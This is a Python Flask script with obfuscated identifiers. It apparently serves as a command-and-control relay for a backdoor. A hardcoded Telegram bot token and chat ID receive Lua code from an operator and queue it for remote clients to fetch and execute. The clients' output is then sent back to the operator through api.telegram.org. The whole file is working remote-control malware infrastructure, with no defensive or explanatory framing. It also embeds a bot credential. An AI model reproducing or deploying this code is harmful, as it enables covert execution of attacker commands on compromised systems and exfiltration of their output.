# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
import threading, time, requests

_q7x = "8986574707:AAELNac5P_5UHCiaPw1DFmsuk143vyMvF3w"
_k2m = 6331040638
_z9v = "x7k2m9p4q1"

_w4n = Flask(__name__)
_t6p = []
_r8s = []
_l3k = threading.Lock()

@_w4n.route("/poll")
def _p1a():
    if request.args.get("token") != _z9v:
        return jsonify({"error": "no"}), 403
    with _l3k:
        _o5c = _t6p[:]
        _t6p.clear()
    return jsonify(_o5c)

@_w4n.route("/result", methods=["POST"])
def _r2b():
    if request.headers.get("X-Token") != _z9v:
        return jsonify({"error": "no"}), 403
    _d7e = request.json or {}
    with _l3k:
        _r8s.append({"cmd": _d7e.get("cmd"), "out": _d7e.get("out", "")[:4000]})
    return jsonify({"ok": True})

def _s3f(_x1y):
    try:
        requests.post(f"https://api.telegram.org/bot{_q7x}/sendMessage",
                      data={"chat_id": _k2m, "text": _x1y[:4000]}, timeout=10)
    except Exception as _e5g:
        print("send err:", _e5g)

def _t9h():
    _l4m = None
    while True:
        try:
            _r6n = requests.get(f"https://api.telegram.org/bot{_q7x}/getUpdates",
                                params={"timeout": 25, "offset": _l4m + 1 if _l4m else -1},
                                timeout=35).json()
            if not _r6n.get("ok"):
                time.sleep(3); continue
            for _u2p in _r6n.get("result", []):
                _l4m = _u2p.get("update_id")
                _m8q = _u2p.get("message") or {}
                _c5r = (_m8q.get("chat") or {}).get("id")
                _x7s = (_m8q.get("text") or "").strip()
                if _c5r != _k2m or not _x7s: continue
                if _x7s == "/start":
                    _s3f("SS ready. Пиши Lua-код или /help."); continue
                if _x7s == "/help":
                    _s3f("exec <lua> — выполнить\n/status — очередь\n/last — результаты"); continue
                if _x7s == "/status":
                    with _l3k: _s3f(f"queue {len(_t6p)}, results {len(_r8s)}")
                    continue
                if _x7s == "/last":
                    with _l3k: _z3q = _r8s[-10:]
                    _s3f("\n\n".join(f"$ {x['cmd']}\n{x['out']}" for x in _z3q) or "empty")
                    continue
                _y6t = _x7s[5:] if _x7s.startswith("exec ") else _x7s
                with _l3k: _t6p.append({"cmd": _y6t, "ts": time.time()})
                _s3f(f"queued: {_y6t[:100]}")
        except Exception as _e5g:
            print("poll err:", _e5g); time.sleep(3)

def _p4w():
    while True:
        time.sleep(2)
        with _l3k:
            if not _r8s: continue
            _b9n = _r8s[:]; _r8s.clear()
        for _x2c in _b9n:
            _s3f(f"$ {_x2c['cmd']}\n{_x2c['out']}")

if __name__ == "__main__":
    threading.Thread(target=_t9h, daemon=True).start()
    threading.Thread(target=_p4w, daemon=True).start()
    print("[+] server started")
    _w4n.run(host="0.0.0.0", port=8080, debug=False)
